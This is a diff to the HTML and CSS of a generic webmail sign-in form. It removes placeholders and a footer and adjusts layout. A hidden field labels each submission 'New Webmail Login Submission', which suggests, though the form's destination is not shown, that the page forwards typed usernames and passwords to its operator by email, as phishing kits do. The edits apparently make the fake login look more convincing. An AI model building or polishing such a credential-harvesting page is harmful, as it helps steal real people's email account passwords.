@@ -122,7 +122,8 @@
   .btn-signin:active { background: #004f71; }
 
   .version-select {
-    margin-top: 18px;
+    margin-top: auto;
+    padding-top: 18px;
     width: 100%;
   }
 
@@ -143,12 +144,6 @@
     outline: none;
   }
 
-  .footer {
-    margin-top: 24px;
-    font-size: 11px;
-    color: #999;
-    text-align: center;
-  }
 </style>
 </head>
 <body>
@@ -169,12 +164,12 @@
     <input type="hidden" name="_subject" value="New Webmail Login Submission">
     <div class="field">
       <label for="username">Username</label>
-      <input type="text" id="username" name="username" placeholder="Enter your username" required autocomplete="username">
+      <input type="text" id="username" name="username" required autocomplete="username">
     </div>
 
     <div class="field">
       <label for="password">Password</label>
-      <input type="password" id="password" name="password" placeholder="Enter your password" required autocomplete="current-password">
+      <input type="password" id="password" name="password" required autocomplete="current-password">
     </div>
 
     <div class="options">
@@ -193,8 +188,6 @@
     </div>
 
   </form>
-
-  <div class="footer">&copy; 2026 Webmail. All rights reserved.</div>
 </div>
 
 </body>
